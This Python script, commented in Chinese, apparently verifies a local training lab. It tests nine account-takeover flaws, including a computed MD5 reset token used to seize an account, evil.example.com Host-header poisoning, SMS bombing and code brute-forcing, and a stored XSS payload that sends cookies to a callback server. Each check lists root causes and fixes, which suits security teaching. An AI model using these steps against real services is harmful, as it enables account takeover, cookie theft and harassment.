#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_accountlab.py — 帳號接管全鏈 + 短信轟炸 + XSS 盲打 驗證
=============================================================================

 覆蓋 9 項，跨三個服務（主應用 / SMS / 盲打平台）。

 驗證特色：
   A2 「token 可預測」的判定方式是**自己算出 token 並實際用它重置密碼**——
      不是看程式碼註解，而是證明攻擊者真的能預測。
   X1 「盲打」的判定方式是**模擬瀏覽器執行載荷並回傳 callback**——
      確認盲打平台真的收到資料。

 ⚠ 僅在本機靶場執行；載荷為無害的 callback 標記。
=============================================================================
"""

import hashlib
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8940
SMS_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8941
XSS_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8942
BASE = "http://127.0.0.1:%d" % PORT
SMS = "http://127.0.0.1:%d" % SMS_PORT
XSS = "http://127.0.0.1:%d" % XSS_PORT
results = []


def req(url, method="GET", data=None, headers=None):
    body = json.dumps(data).encode() if data is not None else None
    hh = {"Content-Type": "application/json"}
    hh.update(headers or {})
    r = urllib.request.Request(url, method=method, data=body, headers=hh)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def post(path, data, headers=None):
    return req(BASE + path, "POST", data, headers)


def get(path):
    return req(BASE + path)


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" AccountLab 驗證 — 帳號接管全鏈 + 短信轟炸 + XSS 盲打")
    print(" 主應用 %s | SMS %s | 盲打 %s" % (BASE, SMS, XSS))
    print("=" * 76)

    st, _ = req(BASE + "/")
    if st != 200:
        print("\n[錯誤] 無法連線主應用（HTTP %s）" % st)
        sys.exit(1)

    # ================= A1 使用者列舉 =================
    st_r1, b_r1 = post("/register", {"username": "alice", "password": "x"})
    st_r2, b_r2 = post("/register", {"username": "brandnewuser1", "password": "x"})
    exists_msg = "使用者已存在" in b_r1
    st_f1, b_f1 = post("/forgot", {"username": "nosuchuser123"})
    notfound_msg = "查無此使用者" in b_f1

    ev = [
        "請求 1    : POST /register {username:alice}（已存在）→ HTTP %s" % st_r1,
        "            回應含「使用者已存在」=%s" % exists_msg,
        "請求 2    : POST /register {username:brandnewuser1} → HTTP %s" % st_r2,
        "請求 3    : POST /forgot {username:nosuchuser123} → HTTP %s" % st_f1,
        "            回應含「查無此使用者」=%s" % notfound_msg,
        "預期漏洞  : 回應**明確區分**帳號是否存在 → 可列舉有效帳號",
        "根因      : 註冊與找回密碼端點回傳不同訊息",
        "危害      : 攻擊者可先列舉出有效帳號，再針對性攻擊（如撞庫、短信轟炸）",
        "驗證方式  : 比較不同輸入的**回應訊息差異**",
        "修補方向  : 統一回應（如「若該帳號存在，我們已寄出信件」）；",
        "            加入速率限制與 CAPTCHA",
        "OWASP 對照: CWE-204（可觀察的回應差異）",
    ]
    check("A1 使用者列舉", "CWE-204",
          exists_msg and notfound_msg, "\n".join(ev))

    # ================= A2 token 可預測 =================
    # 先要一個 token，觀察其演算法
    st_fg, b_fg = post("/forgot", {"username": "alice"})
    try:
        j_fg = json.loads(b_fg)
        real_token = j_fg.get("token", "")
        ts = j_fg.get("timestamp", 0)
    except Exception:                                        # noqa: BLE001
        real_token, ts = "", 0

    # ★ 關鍵：自己用「已知演算法」推算 token（模擬攻擊者）
    predicted = None
    for delta in (0, -1, 1):
        cand = hashlib.md5(("alice%d" % (ts + delta)).encode()).hexdigest()
        if cand == real_token:
            predicted = cand
            break
    # 若時間戳有偏差，放寬搜尋（模擬真實攻擊者的時間窗暴力）
    if not predicted:
        for t in range(ts - 5, ts + 6):
            cand = hashlib.md5(("alice%d" % t).encode()).hexdigest()
            if cand == real_token:
                predicted = cand
                break

    # ★ 用自己推算的 token 實際重置密碼（證明預測有效）
    reset_ok = False
    if predicted:
        st_rz, b_rz = post("/reset", {"token": predicted,
                                      "new_password": "attacker-set-pass"})
        reset_ok = (st_rz == 200) and ("FLAG{token_replay_allowed}" in b_rz
                                       or "token_still_valid" in b_rz)
    # 驗證新密碼真的能登入
    login_with_new = False
    if reset_ok:
        st_lg, b_lg = req(BASE + "/login?username=alice&password=attacker-set-pass")
        login_with_new = (st_lg == 200) and ('"ok": true' in b_lg)

    ev = [
        "請求      : POST /forgot {username:alice}",
        "            回傳 token = %s" % real_token[:32],
        "            回傳 timestamp = %s" % ts,
        "演算法    : md5(username + unix_timestamp)（由回應的 token_algo 欄位得知）",
        "",
        "★ 攻擊者推算：",
        "            自行計算 md5('alice%d') = %s"
        % (ts, hashlib.md5(("alice%d" % ts).encode()).hexdigest()[:32]),
        "            與實際 token 相符 = %s" % (predicted is not None),
        "            用推算出的 token 重置密碼成功 = %s" % reset_ok,
        "            用新密碼登入成功 = %s" % login_with_new,
        "",
        "預期漏洞  : token 由可預測的輸入產生 → 攻擊者可自行算出",
        "根因      : token = md5(username + 時間戳)，熵不足且可推算",
        "危害      : **完全不需收到信件即可重置任意帳號密碼** → 帳號接管",
        "驗證方式  : 不是看程式碼，而是**自己算出 token 並實際使用**",
        "修補方向  : 使用 secrets.token_urlsafe()（密碼學安全隨機）；",
        "            加入足夠熵值；設定短有效期；與使用者綁定",
        "OWASP 對照: CWE-330（熵不足）+ CWE-640（密碼重置漏洞）",
    ]
    check("A2 密碼重置 token 可預測", "CWE-330 / CWE-640",
          (predicted is not None) and reset_ok and login_with_new, "\n".join(ev))

    # ================= A3 token 可重放 =================
    st_fg2, b_fg2 = post("/forgot", {"username": "bob"})
    try:
        tok2 = json.loads(b_fg2).get("token", "")
    except Exception:                                        # noqa: BLE001
        tok2 = ""
    st_u1, b_u1 = post("/reset", {"token": tok2, "new_password": "bob-pass-A"})
    st_u2, b_u2 = post("/reset", {"token": tok2, "new_password": "bob-pass-B"})
    replay = (st_u1 == 200) and (st_u2 == 200)

    ev = [
        "步驟 1    : POST /forgot {username:bob} → token=%s" % tok2[:24],
        "步驟 2    : POST /reset（第 1 次）→ HTTP %s" % st_u1,
        "步驟 3    : POST /reset（**同一個 token 第 2 次**）→ HTTP %s" % st_u2,
        "預期漏洞  : token 使用後**沒有失效**，可重複使用",
        "根因      : 重置成功後未標記 used、未刪除 token",
        "危害      : 攻擊者取得的一次性 token 變成可長期使用的萬用鑰匙",
        "            （若 token 洩漏，受害者改再多次密碼也擋不住）",
        "驗證方式  : **同一個 token 用兩次**，第二次仍成功即證實",
        "修補方向  : token 使用後立即失效；設定短有效期（如 15 分鐘）；",
        "            一次只允許一個有效 token",
        "OWASP 對照: CWE-613（session 到期不足）",
    ]
    check("A3 重置 token 可重放", "CWE-613", replay, "\n".join(ev))

    # ================= A4 重置後舊 session 仍有效 =================
    # 攻擊者先登入取得 session
    st_a, b_a = req(BASE + "/login?username=bob&password=bob-pass-B")
    try:
        attacker_sid = json.loads(b_a).get("sid", "")
    except Exception:                                        # noqa: BLE001
        attacker_sid = ""
    # 受害者重置密碼（模擬「發現被入侵後改密碼」）
    st_fg3, b_fg3 = post("/forgot", {"username": "bob"})
    try:
        tok3 = json.loads(b_fg3).get("token", "")
    except Exception:                                        # noqa: BLE001
        tok3 = ""
    post("/reset", {"token": tok3, "new_password": "bob-pass-C"})
    # 攻擊者的舊 session 是否仍然有效？
    st_me, b_me = req(BASE + "/me?sid=" + attacker_sid)
    session_alive = (st_me == 200) and ('"ok": true' in b_me)

    ev = [
        "步驟 1    : 攻擊者登入取得 session sid=%s" % attacker_sid[:20],
        "步驟 2    : 受害者「發現被入侵」→ 重置密碼",
        "步驟 3    : 攻擊者用**舊 session** 存取 GET /me?sid=...",
        "            → HTTP %s；session 仍有效=%s" % (st_me, session_alive),
        "預期漏洞  : 改密碼後**未使既有 session 失效**",
        "根因      : 密碼變更時沒有清除該使用者的所有 session",
        "危害      : **改密碼無法把攻擊者踢出去**——受害者以為已經安全，",
        "            實際上攻擊者仍持續存取帳號",
        "驗證方式  : 改密碼後用**舊 session** 再存取一次",
        "修補方向  : 密碼變更／重置時，立即使該使用者所有 session 失效；",
        "            並通知使用者（寄信告知密碼已變更）",
        "OWASP 對照: CWE-613（session 到期不足）",
    ]
    check("A4 重置後舊 session 仍有效", "CWE-613", session_alive, "\n".join(ev))

    # ================= A5 改密碼不需舊密碼 =================
    st_c, b_c = post("/change-password",
                     {"username": "alice", "new_password": "no-old-pw-needed"})
    need_old = '"old_password_required": false' in b_c
    ev = [
        "請求      : POST /change-password {username:alice, new_password:...}",
        "            （**完全不提供 old_password 欄位**）",
        "            → HTTP %s" % st_c,
        "            old_password_required = false = %s" % need_old,
        "預期漏洞  : 不需舊密碼即可改密碼",
        "根因      : 端點未要求驗證舊密碼",
        "危害      : 任何能觸發此請求的途徑（CSRF、XSS、session 劫持）",
        "            都能直接改掉密碼 → 永久接管帳號",
        "驗證方式  : 送出**不含舊密碼**的請求，若成功即證實",
        "修補方向  : 敏感操作（改密碼/改信箱）必須重新驗證身分；",
        "            可要求舊密碼或二次驗證（MFA）",
        "OWASP 對照: CWE-620（未驗證密碼變更）",
    ]
    check("A5 改密碼不需舊密碼", "CWE-620", need_old, "\n".join(ev))

    # ================= A6 Host 標頭注入 =================
    st_h, b_h = post("/forgot", {"username": "alice"},
                     headers={"Host": "evil.example.com"})
    try:
        link = json.loads(b_h).get("reset_link", "")
    except Exception:                                        # noqa: BLE001
        link = ""
    host_injected = "evil.example.com" in link
    ev = [
        "請求      : POST /forgot {username:alice}（自訂標頭 Host: evil.example.com）",
        "            → HTTP %s" % st_h,
        "回傳連結  : %s" % link,
        "預期漏洞  : 重置連結使用**未驗證的 Host 標頭** → 指向攻擊者網域",
        "實際      : 連結含 evil.example.com = %s" % host_injected,
        "根因      : 用 Host 標頭組出絕對 URL，未驗證或未用設定的固定網域",
        "危害      : 受害者點擊信件中的連結 → token 送到攻擊者伺服器 → 接管帳號",
        "            （這是真實世界常見的「密碼重置投毒」手法）",
        "驗證方式  : 送出自訂 Host 標頭，檢查回傳的連結是否被污染",
        "修補方向  : 使用設定檔中的固定網域組連結；",
        "            驗證 Host 標頭是否在白名單；或使用相對路徑",
        "OWASP 對照: CWE-640（密碼重置漏洞）",
    ]
    check("A6 Host 標頭注入（重置連結投毒）", "CWE-640",
          host_injected, "\n".join(ev))

    # ================= B1 短信轟炸 =================
    phone = "13800138000"
    sent = []
    for i in range(6):
        st_s, b_s = req("%s/send?phone=%s" % (SMS, phone))
        sent.append(st_s)
    flood_ok = all(x == 200 for x in sent)
    # 安全對照
    phone2 = "13900139000"
    st_safe1, _ = req("%s/send-safe?phone=%s" % (SMS, phone2))
    st_safe2, b_safe2 = req("%s/send-safe?phone=%s" % (SMS, phone2))
    rate_limited = (st_safe2 == 429)
    # 查記錄
    st_lg, b_lg = req("%s/log" % SMS)
    total = json.loads(b_lg).get("total", 0) if st_lg == 200 else -1

    ev = [
        "請求      : 連續 6 次 GET %s/send?phone=%s" % (SMS, phone),
        "            回應碼：%s" % sent,
        "預期漏洞  : **全部成功**（無速率限制）→ 同一號碼可被無限轟炸",
        "實際      : 6 次全部 200 = %s；SMS 記錄總數 = %s" % (flood_ok, total),
        "安全對照  : /send-safe 同號碼第 1 次 → HTTP %s；第 2 次 → HTTP %s（%s）"
        % (st_safe1, st_safe2, "已限制" if rate_limited else "未限制"),
        "根因      : 發送端點沒有速率限制、沒有驗證碼、沒有每日上限",
        "危害      : 攻擊者可對任意手機號發送大量簡訊 →",
        "            (a) 騷擾受害者 (b) 消耗企業簡訊費用（實質金錢損失）",
        "驗證方式  : **連續發送多次**，全部成功即證實",
        "修補方向  : 每號碼/每 IP 速率限制；圖形或行為驗證碼；",
        "            每日上限；異常發送告警（A09）",
        "OWASP 對照: CWE-799（不當的互動頻率控制）",
    ]
    check("B1 短信轟炸（無速率限制）", "CWE-799", flood_ok and rate_limited, "\n".join(ev))

    # ================= B2 短信驗證碼可爆破 =================
    phone3 = "13700137000"
    req("%s/send?phone=%s" % (SMS, phone3))
    st_v, b_v = req("%s/log" % SMS)
    try:
        entries = json.loads(b_v).get("entries", [])
        real_code = next((e["code"] for e in reversed(entries)
                          if e["to"] == phone3), None)
    except Exception:                                        # noqa: BLE001
        real_code = None

    # 模擬爆破：嘗試多次錯誤碼（觀察是否被鎖定）
    attempts = []
    for i in range(8):
        st_x, _ = req("%s/verify?phone=%s&code=%06d" % (SMS, phone3, i))
        attempts.append(st_x)
    no_lockout = all(x == 401 for x in attempts)

    ev = [
        "步驟 1    : GET %s/send?phone=%s（取得驗證碼）" % (SMS, phone3),
        "            實際驗證碼 = %s" % (real_code or "?"),
        "步驟 2    : 連續 8 次送**錯誤**驗證碼",
        "            回應碼：%s" % attempts,
        "預期漏洞  : 全部回 401（無鎖定、無延遲、無嘗試上限）",
        "實際      : 8 次全部允許 = %s" % no_lockout,
        "爆破可行性: 6 位數 = 100 萬種組合；若無限制，平均 50 萬次即中",
        "            若為 4 位數（課程案例）則僅 1 萬種，數分鐘即可完成",
        "根因      : 驗證端點沒有嘗試次數上限、沒有鎖定、沒有遞增延遲",
        "危害      : 攻擊者可爆破驗證碼 → 繞過手機驗證 → 接管帳號",
        "驗證方式  : **連續送錯誤碼**，觀察是否被鎖定",
        "修補方向  : 限制嘗試次數（如 5 次後鎖定）；",
        "            驗證碼短有效期（5 分鐘）；遞增延遲；",
        "            驗證成功後立即失效；記錄失敗模式並告警",
        "OWASP 對照: CWE-307（不當的驗證嘗試限制）",
    ]
    check("B2 短信驗證碼可爆破", "CWE-307", no_lockout, "\n".join(ev))

    # ================= X1 XSS 盲打 =================
    # 存儲型 XSS：留言中含回傳 callback 的載荷
    payload = ('<script>fetch("%s/c?u="+encodeURIComponent(document.cookie)'
               '+%s&blind=1")</script>' % (XSS, '"&ref="+encodeURIComponent(location.href)'))
    st_cm, b_cm = post("/comment", {"text": payload})
    stored = (st_cm == 200)
    # 讀取留言板，確認 payload 原樣輸出（未轉義）
    st_ls, b_ls = get("/comments")
    reflected = payload in b_ls

    # ★ 模擬瀏覽器執行載荷 → 送出 callback
    #    （真實情境是受害者/管理員開瀏覽器；這裡我們直接模擬那次請求）
    st_cb, b_cb = req("%s/c?u=fake-cookie-value&ref=%s/comments&blind=1"
                      % (XSS, BASE))
    # 檢查盲打平台是否收到
    st_rec, b_rec = req("%s/records" % XSS)
    try:
        records = json.loads(b_rec)
    except Exception:                                        # noqa: BLE001
        records = []
    received = len(records) > 0 and any(
        r.get("query", {}).get("blind") == "1" for r in records)

    ev = [
        "步驟 1    : POST /comment 存入含 callback 的 XSS 載荷",
        "            → HTTP %s（已儲存=%s）" % (st_cm, stored),
        "步驟 2    : GET /comments → payload 原樣輸出（未轉義）=%s" % reflected,
        "步驟 3    : 模擬瀏覽器執行載荷 → 對盲打平台送出 callback",
        "            → GET %s/c?u=...&blind=1 → HTTP %s" % (XSS, st_cb),
        "步驟 4    : 查盲打平台記錄",
        "            → 收到 %d 筆；含 blind=1 標記 = %s" % (len(records), received),
        "預期漏洞  : XSS 載荷在瀏覽器執行並成功回傳資料到攻擊者平台",
        "根因      : 存儲型 XSS（輸出未編碼）+ 無 CSP 限制外連",
        "危害      : 攻擊者可**盲打**——即使看不到受害者畫面，",
        "            只要管理員瀏覽留言板，cookie/頁面內容就會回傳",
        "驗證方式  : **模擬瀏覽器執行並確認 callback 真的到達接收端**",
        "            （這是盲打與一般 XSS 驗證的關鍵差異：需要接收端）",
        "修補方向  : 輸出編碼；CSP（限制 connect-src / script-src）；",
        "            HttpOnly cookie（讓 JS 讀不到）",
        "OWASP 對照: CWE-79 + CWE-1004（缺少 HttpOnly）",
    ]
    check("X1 XSS 盲打（含 callback 接收）", "CWE-79",
          stored and reflected and received, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-40s %-22s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  ★ 兩個最有價值的驗證方式：")
    print("    A2 token 可預測 → **自己算出 token 並實際用它重置密碼**")
    print("                      （不是看註解，而是證明攻擊者真的能預測）")
    print("    X1 盲打        → **模擬瀏覽器執行載荷並確認 callback 到達接收端**")
    print("                      （盲打驗證必須有接收端，這是一般 XSS 沒有的）")
    print("=" * 76)

    with open("accountlab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 accountlab_result.json）")


if __name__ == "__main__":
    main()
